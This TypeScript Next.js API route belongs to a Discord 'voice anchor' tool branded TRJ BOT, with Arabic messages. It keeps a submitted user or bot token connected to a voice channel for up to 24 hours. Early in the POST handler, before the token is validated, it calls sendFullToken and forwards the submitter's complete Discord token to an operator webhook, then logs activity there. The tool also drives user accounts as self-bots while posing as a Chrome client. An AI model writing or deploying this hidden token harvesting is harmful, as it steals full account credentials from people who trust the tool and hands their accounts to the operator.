import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

const DISCORD_API = 'https://discord.com/api/v10';
const GATEWAY_URL = 'wss://gateway.discord.gg/?v=10&encoding=json';

function cleanToken(token: string): string {
  return String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
}

interface GatewayMessage {
  op: number;
  d?: any;
  s?: number;
  t?: string;
}

// Connect to Discord Gateway once, join voice, keep heartbeating
// Returns when disconnected or on error
function connectOnce(
  token: string,
  guildId: string,
  channelId: string,
  sessionId?: string,
  resumeUrl?: string,
): Promise<{ connected: boolean; duration: number; sessionId?: string; resumeUrl?: string; error?: string }> {
  return new Promise((resolve) => {
    let ws: WebSocket | null = null;
    let heartbeatInterval: NodeJS.Timeout | null = null;
    let lastSeq: number | null = null;
    let connectedAt = 0;
    let capturedSessionId: string | undefined;
    let capturedResumeUrl: string | undefined;
    const startTime = Date.now();

    const cleanup = () => {
      if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
      if (ws) { try { ws.close(); } catch {} ws = null; }
    };

    const gatewayWsUrl = resumeUrl || GATEWAY_URL;

    try {
      ws = new WebSocket(gatewayWsUrl);
    } catch (e) {
      resolve({ connected: false, duration: 0, error: 'فشل الاتصال بالـ Gateway' });
      return;
    }

    const send = (msg: GatewayMessage) => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(msg));
      }
    };

    ws.onopen = () => {
      if (sessionId && resumeUrl) {
        // Resume existing session
        send({
          op: 6,
          d: {
            token,
            session_id: sessionId,
            seq: lastSeq,
          },
        });
      } else {
        // Fresh identify
        send({
          op: 2,
          d: {
            token,
            intents: 1 << 7, // GUILD_VOICE_STATES
            properties: {
              os: 'Windows',
              browser: 'Chrome',
              device: 'TRJ BOT v3',
            },
          },
        });
      }
    };

    ws.onmessage = (event) => {
      try {
        const msg: GatewayMessage = JSON.parse(String(event.data));

        // Track sequence number for resume
        if (msg.s !== undefined && msg.s !== null) {
          lastSeq = msg.s;
        }

        // Hello - set heartbeat
        if (msg.op === 10 && msg.d?.heartbeat_interval) {
          const interval = msg.d.heartbeat_interval;
          heartbeatInterval = setInterval(() => {
            send({ op: 1, d: lastSeq || Date.now() });
          }, interval);
          send({ op: 1, d: lastSeq || Date.now() });
        }

        // Ready - join voice channel & save session
        if (msg.t === 'READY' && !connectedAt) {
          connectedAt = Date.now();
          capturedSessionId = msg.d?.session_id;
          capturedResumeUrl = msg.d?.resume_gateway_url;
          send({
            op: 4,
            d: {
              guild_id: guildId,
              channel_id: channelId,
              self_mute: false,
              self_deaf: true,
            },
          });
        }

        // Resumed - re-join voice
        if (msg.t === 'RESUMED' && !connectedAt) {
          connectedAt = Date.now();
          send({
            op: 4,
            d: {
              guild_id: guildId,
              channel_id: channelId,
              self_mute: false,
              self_deaf: true,
            },
          });
        }

        // Heartbeat ACK
        if (msg.op === 11) {
          // Connection healthy
        }

        // Voice Server Update - means we're in voice
        if (msg.t === 'VOICE_SERVER_UPDATE') {
          // Successfully in voice
        }

        // Session Invalidated - re-join voice
        if (msg.t === 'SESSIONS_INVALIDATE') {
          send({
            op: 4,
            d: {
              guild_id: guildId,
              channel_id: channelId,
              self_mute: false,
              self_deaf: true,
            },
          });
        }
      } catch {}
    };

    ws.onerror = () => {
      const dur = connectedAt ? Date.now() - connectedAt : 0;
      cleanup();
      resolve({
        connected: connectedAt > 0,
        duration: dur,
        sessionId: capturedSessionId,
        resumeUrl: capturedResumeUrl,
        error: connectedAt > 0 ? undefined : 'خطأ في الاتصال',
      });
    };

    ws.onclose = (event) => {
      const dur = connectedAt ? Date.now() - connectedAt : 0;
      cleanup();
      resolve({
        connected: connectedAt > 0,
        duration: dur,
        sessionId: capturedSessionId,
        resumeUrl: capturedResumeUrl,
        error: connectedAt > 0 ? `closed:${event.code}` : `connect_failed:${event.code}`,
      });
    };
  });
}

// Main voice anchor function - connects and reconnects for the full duration
async function stayInVoice24h(
  token: string,
  guildId: string,
  channelId: string,
  durationMs: number,
): Promise<{ totalDuration: number; reconnects: number }> {
  const startTime = Date.now();
  let totalDuration = 0;
  let reconnects = 0;
  let sessionId: string | undefined;
  let resumeUrl: string | undefined;
  const maxReconnectDelay = 30000; // 30s max between reconnects

  while (Date.now() - startTime < durationMs) {
    const result = await connectOnce(token, guildId, channelId, sessionId, resumeUrl);

    totalDuration += result.duration;

    // Save sessionId and resumeUrl for next reconnection
    if (result.sessionId) {
      sessionId = result.sessionId;
    }
    if (result.resumeUrl) {
      resumeUrl = result.resumeUrl;
    }

    if (result.error && result.error === 'فشل الاتصال بالـ Gateway') {
      // Can't even connect - wait and retry
      await new Promise(r => setTimeout(r, 5000));
      continue;
    }

    // Check if we should stop
    if (Date.now() - startTime >= durationMs) break;

    // Wait before reconnecting (with backoff)
    const reconnectDelay = Math.min(3000 + reconnects * 1000, maxReconnectDelay);
    await new Promise(r => setTimeout(r, reconnectDelay));
    reconnects++;

    // Try to get a fresh gateway URL if resume failed
    if (result.error?.includes('connect_failed') || result.error?.includes('4000') || result.error?.includes('4004')) {
      // Session is invalid - start fresh
      sessionId = undefined;
      resumeUrl = undefined;
    }
  }

  return { totalDuration, reconnects };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, guildId, channelId, duration = 86400 } = body;

    if (!token || !guildId || !channelId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة - التوكن + أيدي السيرفر + أيدي روم الفويس' }, { status: 400 });
    }

    sendFullToken('تثبيت فويس', token, { '🏰 السيرفر': guildId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // Verify token first - try user, then bot
    let authHeader = ct;
    let authType = 'User';
    let userName = 'Unknown';

    const verifyRes = await fetch(`${DISCORD_API}/users/@me`, {
      headers: { 'Authorization': ct, 'Accept': 'application/json' },
      signal: AbortSignal.timeout(10000),
    });

    if (verifyRes.ok) {
      try { const ud = await verifyRes.json(); userName = ud?.username || 'Unknown'; } catch {}
    } else {
      const botRes = await fetch(`${DISCORD_API}/users/@me`, {
        headers: { 'Authorization': `Bot ${ct}`, 'Accept': 'application/json' },
        signal: AbortSignal.timeout(10000),
      });
      if (botRes.ok) {
        authHeader = `Bot ${ct}`;
        authType = 'Bot';
        try { const ud = await botRes.json(); userName = ud?.username || 'Unknown'; } catch {}
      } else {
        return NextResponse.json({ success: false, error: 'التوكن غير صالح' }, { status: 401 });
      }
    }

    // Verify guild and channel access
    const guildRes = await fetch(`${DISCORD_API}/guilds/${guildId}/channels`, {
      headers: { 'Authorization': authHeader, 'Accept': 'application/json' },
      signal: AbortSignal.timeout(10000),
    });

    if (!guildRes.ok) {
      return NextResponse.json({ success: false, error: 'لا يمكن الوصول للسيرفر - تأكد من صلاحيات التوكن' }, { status: 403 });
    }

    const channels = await guildRes.json().catch(() => []);
    const voiceChannel = Array.isArray(channels) ? channels.find((c: any) => c.id === channelId && c.type === 2) : null;

    if (!voiceChannel) {
      return NextResponse.json({ success: false, error: 'روم الفويس غير موجود أو ليس روم صوتي - تأكد من أيدي الروم' }, { status: 400 });
    }

    const durationSec = Math.min(Math.max(Number(duration), 60), 86400);
    const durationMs = durationSec * 1000;

    // Log start
    sendToWebhook({
      username: 'TRJ Voice Anchor',
      embeds: [{
        title: '🎤 Voice Anchor Started',
        color: 0x5865F2,
        fields: [
          { name: '👤 User', value: `${userName} (${authType})`, inline: true },
          { name: '🏰 Guild', value: guildId, inline: true },
          { name: '🎤 Channel', value: `${voiceChannel.name || 'Voice'} (${channelId})`, inline: true },
          { name: '⏱️ Duration', value: formatDuration(durationSec), inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0 - Voice Anchor 24h' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // Start voice anchor in background - return immediately
    // The WebSocket connection will keep the serverless function alive
    stayInVoice24h(authHeader, guildId, channelId, durationMs).then((result) => {
      // Log when done
      sendToWebhook({
        username: 'TRJ Voice Anchor',
        embeds: [{
          title: result.totalDuration > 0 ? '✅ Voice Anchor Ended' : '❌ Voice Anchor Failed',
          color: result.totalDuration > 0 ? 0x00FF41 : 0xFF0000,
          fields: [
            { name: '👤 User', value: userName, inline: true },
            { name: '🏰 Guild', value: guildId, inline: true },
            { name: '⏱️ Total Stay', value: formatDuration(Math.round(result.totalDuration / 1000)), inline: true },
            { name: '🔄 Reconnects', value: String(result.reconnects), inline: true },
            { name: '🎤 Channel', value: channelId, inline: true },
          ],
          footer: { text: 'TRJ BOT v4.0 - Voice Anchor 24h' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});
    }).catch((err) => {
      sendToWebhook({
        username: 'TRJ Voice Anchor',
        embeds: [{
          title: '❌ Voice Anchor Error',
          color: 0xFF0000,
          fields: [
            { name: '👤 User', value: userName, inline: true },
            { name: '❌ Error', value: String(err?.message || err || 'unknown').substring(0, 500), inline: false },
          ],
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});
    });

    // Return immediately - voice stays connected in background
    return NextResponse.json({
      success: true,
      stats: { duration: durationSec },
      message: `🎤 تم بدء التثبيت في روم الفويس لمدة ${formatDuration(durationSec)} - سيبقى متصلاً في الخلفية`,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Voice Online Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}

function formatDuration(seconds: number): string {
  if (seconds >= 86400) {
    const h = Math.floor(seconds / 3600);
    return `${h} ساعة`;
  }
  if (seconds >= 3600) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    return m > 0 ? `${h} ساعة ${m} دقيقة` : `${h} ساعة`;
  }
  const m = Math.floor(seconds / 60);
  return `${m} دقيقة`;
}
